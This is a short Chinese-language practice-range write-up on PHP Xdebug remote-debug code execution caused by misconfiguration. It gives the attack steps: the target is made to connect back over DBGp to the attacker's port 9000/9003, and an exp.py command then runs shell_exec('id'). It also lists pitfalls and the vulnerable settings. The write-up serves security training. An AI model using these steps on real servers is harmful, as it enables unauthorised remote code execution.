# 167｜PHP Xdebug 远程调试代码执行

- 镜像：`vulfocus/xdebug-rce`
- 题库端口：`80`
- 无 CVE（错误配置）

## 一句话打法

用 `XDEBUG_SESSION_START` 让目标对攻击者 **9000/9003** 回连 DBGp，再发 `eval` 执行 PHP。[S1][S2]

## 操作步骤

1. 仅 HTTP 触发不够。攻击机监听 9000（Xdebug 2.x）和 9003（3.x），且容器能连到该 IP。[S1]
2. 使用 Vulhub `exp.py`（或等价 DBGp 客户端）：[S1][S2]

   ```powershell
   python3 exp.py -t "http://<靶场IP>/index.php" -c "shell_exec('id');" --dbgp-ip <容器可达的攻击者IP>
   ```

   脚本会发带 `XDEBUG_SESSION_START=phpstorm` 的 GET，并完成 DBGp `eval`。
3. 成功信号：脚本打印命令输出（如 `uid=`）。[S1]

## 本题特有排坑

- 防火墙挡住 9000/9003 或 `--dbgp-ip` 填成攻击者本机 127.0.0.1 会超时。[S1]
- Vulhub 示例端口是 8080/8081，本题内部是 **80**。[S1][S3]
- 2.x 条件：`remote_enable=1` 且 `remote_connect_back=1`；3.x：`mode=debug` 且 `discover_client_host=1`。[S1]

## 来源

- [S1] Vulhub xdebug-rce 中文 README。详见[来源清单](../sources/167_xdebug-rce/_meta.md)。
- [S2] Vulhub `exp.py`。详见[来源清单](../sources/167_xdebug-rce/_meta.md)。
- [S3] Docker Hub `vulfocus/xdebug-rce`。详见[来源清单](../sources/167_xdebug-rce/_meta.md)。
